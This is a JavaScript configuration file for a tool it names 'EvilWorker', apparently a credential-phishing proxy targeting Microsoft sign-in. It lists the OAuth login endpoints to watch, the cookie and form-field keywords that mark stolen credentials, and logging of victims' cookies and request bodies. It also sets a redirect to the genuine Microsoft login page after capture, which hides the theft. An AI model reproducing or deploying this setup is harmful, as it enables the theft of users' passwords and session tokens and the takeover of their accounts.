// EvilWorker Configuration File
// This file contains settings for credential collection and redirect behavior

module.exports = {
    // Credential Collection Settings
    credentials: {
        // Enable/disable automatic redirect after credential collection
        enableRedirect: process.env.ENABLE_CREDENTIAL_REDIRECT !== "false",
        
        // URL to redirect to after collecting credentials
        redirectUrl: process.env.CREDENTIALS_REDIRECT_URL || "https://login.microsoftonline.com/",
        
        // Keywords to detect credential-related cookies
        credentialKeywords: [
            'email', 'password', 'credential', 'auth', 'token', 
            'session', 'login', 'username', 'user', 'pass'
        ],
        
        // Login endpoints to monitor for credential submission
        loginEndpoints: [
            '/login', '/signin', '/auth', '/authenticate', '/signon',
            '/common/login', '/common/signin', '/oauth2/authorize',
            '/oauth2/v2.0/authorize', '/common/oauth2/authorize'
        ],
        
        // Form field names that indicate credential submission
        credentialFields: [
            'email', 'password', 'username', 'user', 'pass', 'pwd',
            'login', 'signin', 'auth', 'credential'
        ]
    },
    
    // Logging Settings
    logging: {
        // Enable detailed credential collection logging
        enableCredentialLogging: true,
        
        // Log format for credential events
        credentialLogFormat: {
            timestamp: true,
            session: true,
            event: true,
            redirectUrl: true,
            cookies: true,
            requestBody: true
        }
    },
    
    // Security Settings
    security: {
        // Minimum number of credential indicators before redirect
        minCredentialIndicators: 1,
        
        // Enable session cleanup after redirect
        cleanupSessionAfterRedirect: false,
        
        // Additional security headers for redirect
        redirectHeaders: {
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        }
    }
};
